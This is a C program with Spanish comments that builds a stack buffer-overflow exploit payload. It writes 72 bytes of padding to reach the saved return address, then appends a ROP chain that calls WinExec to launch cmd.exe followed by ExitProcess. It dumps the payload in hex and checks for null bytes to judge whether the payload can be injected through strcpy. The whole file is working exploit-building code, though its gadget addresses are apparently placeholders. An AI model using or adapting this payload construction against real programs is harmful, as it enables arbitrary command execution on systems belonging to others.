#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define OFFSET_TO_RIP 72
#define MAX_PAYLOAD 256

/* Empaquetar un uint64 en little-endian en buf[offset] */
static void pack64(uint8_t *buf, size_t offset, uint64_t val) {
    *(uint64_t *) (buf + offset) = val; /* x86 ya es LE */
}

int main(void) {
    uint8_t payload[MAX_PAYLOAD] = {0};
    size_t off = 0;

    /* Padding hasta RIP */
    memset(payload, 0x41, OFFSET_TO_RIP);
    off = OFFSET_TO_RIP;

    /* ROP chain: pop rcx; ret -> &"cmd.exe" -> rdx; ret -> 1 -> WinExec */
    pack64(payload, off, 0x0000000140001111ULL);
    off += 8; /* pop rcx */
    pack64(payload, off, 0x0000000140005678ULL);
    off += 8; /* "cmd.exe" */
    pack64(payload, off, 0x0000000140002222ULL);
    off += 8; /* pop rdx */
    pack64(payload, off, 0x0000000000000001ULL);
    off += 8; /* SW_SHOW */
    pack64(payload, off, 0x0000000140001234ULL);
    off += 8; /* WinExec */
    pack64(payload, off, 0x0000000140003333ULL);
    off += 8; /* ExitProcess */

    printf("[+] payload: %zu bytes\n", off);
    printf("    padding: %d bytes (0x41 x %d)\n", OFFSET_TO_RIP, OFFSET_TO_RIP);

    /* Verificar que el padding es correcto */
    for (int i = 0; i < OFFSET_TO_RIP; i++) {
        if (payload[i] != 0x41) {
            printf("[!] padding corrupto\n");
            return 1;
        }
    }
    printf("[+] padding verificado\n");

    printf("\n[+] payload completo:\n");
    for (size_t i = 0; i < off; i++) {
        printf("%02X ", payload[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }

    int nulls = 0;
    for (size_t i = 0; i < off; i++) {
        if (payload[i] == 0x00) {
            nulls++;
        }
    }
    printf("\n[*] null bytes en payload: %d\n", nulls);
    if (nulls > 0) {
        printf("[!] payload NO es inyectable via strcpy\n");
    } else {
        printf("[*] payload inyectable via strcpy\n");
    }
    return 0;
}
